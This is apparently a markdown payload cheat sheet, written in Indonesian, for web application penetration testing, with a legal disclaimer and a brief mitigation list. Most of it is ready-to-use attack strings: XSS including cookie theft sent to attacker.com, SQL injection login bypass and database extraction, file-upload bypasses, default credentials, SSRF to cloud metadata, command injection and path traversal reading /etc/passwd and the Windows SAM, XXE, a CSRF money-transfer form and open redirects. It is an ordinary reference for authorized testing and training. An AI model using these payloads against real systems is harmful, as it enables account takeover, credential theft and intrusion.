# Penetration Testing Payloads Collection

Dokumentasi kumpulan payload untuk penetration testing berbagai vulnerability web application.

## ⚠️ Disclaimer

Payload ini **HANYA** untuk:
- Security testing yang sah dengan izin tertulis
- Bug bounty program yang authorized
- Learning environment / lab sendiri
- Professional penetration testing dengan proper authorization

**DILARANG** digunakan untuk:
- Sistem tanpa izin
- Aktivitas ilegal
- Merusak sistem orang lain

## 🔍 XSS (Cross-Site Scripting)

### XSS pada Kolom Search
```html
<script>alert('XSS')</script>
"><script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**Payload Bypass Filter:**
```html
<ScRiPt>alert('XSS')</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert('XSS')">
<svg><script>alert&#40;'XSS'&#41;</script>
```

### XSS pada Kolom Komentar
```html
<script>alert('XSS Comment')</script>
<img src=x onerror=alert(document.domain)>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

**Payload untuk Steal Cookie:**
```html
<script>new Image().src="http://attacker.com/steal.php?c="+document.cookie;</script>
<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
```

## 💉 SQL Injection

### Basic SQLi
```sql
' OR '1'='1
' OR 1=1--
' OR '1'='1' --
admin'--
admin' #
' UNION SELECT NULL--
```

### Login Bypass
```sql
admin' OR '1'='1
' OR '1'='1' --
admin'/*
' or 1=1 limit 1 --
```

### Data Extraction
```sql
' UNION SELECT table_name,null FROM information_schema.tables--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

## 📂 File Upload Vulnerability

### Extension Bypass
```
shell.php.jpg
shell.php%00.jpg
shell.php%0d%0a.jpg
shell.php.xxx (if xxx not validated)
shell.php%20
shell.php::$DATA
```

### Double Extension
```
shell.jpg.php
shell.php.test
shell.php;.jpg
```

### Null Byte
```
shell.php%00.jpg
shell.php\x00.jpg
```

## 🔓 Authentication Bypass

### Username Enumeration
```
admin
administrator
root
test
user
guest
```

### Password Patterns
```
admin:admin
admin:password
admin:123456
root:root
test:test
```

## 🌐 SSRF (Server-Side Request Forgery)
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
http://[::1]
http://2130706433
http://0x7f000001
```

## 📝 Command Injection
```bash
; ls
| ls
& ls
&& ls
; cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
; whoami
| whoami
```

## 🔀 Path Traversal / Directory Traversal
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..;/..;/..;/etc/passwd
```

## 🔧 IDOR (Insecure Direct Object Reference)
```
/user/profile?id=1
/user/profile?id=2
/api/user/1
/api/user/2
/document/view?doc_id=100
/document/view?doc_id=101
```

## 🍪 Session/Cookie Manipulation
```
Cookie: admin=true
Cookie: role=admin
Cookie: isAdmin=1
Cookie: user_id=1
```

## 📊 XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<foo>&xxe;</foo>
```

## 🔐 CSRF (Cross-Site Request Forgery)
```html
<img src="http://target.com/changepassword?new=hacked">
<form action="http://target.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

## 🎯 Open Redirect
```
?redirect=http://evil.com
?url=//evil.com
?next=javascript:alert(1)
?return=http://evil.com
```

## 📚 Referensi & Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## 🛡️ Mitigasi Umum

1. **XSS**: Input validation, output encoding, CSP headers
2. **SQLi**: Prepared statements, parameterized queries
3. **File Upload**: Validate file type, rename files, store outside web root
4. **SSRF**: Whitelist allowed hosts, disable URL redirects
5. **Command Injection**: Avoid system calls, input sanitization
6. **IDOR**: Implement proper access control
7. **CSRF**: Use CSRF tokens, SameSite cookies

## 📖 Legal Notice

Penggunaan payload ini untuk tujuan ilegal adalah melanggar hukum. Selalu dapatkan izin tertulis sebelum melakukan penetration testing. Author tidak bertanggung jawab atas penyalahgunaan informasi ini.

---

**Author**: Sultan Raja Marlindo
**Last Updated**: December 2025  
**License**: Educational Purpose Only
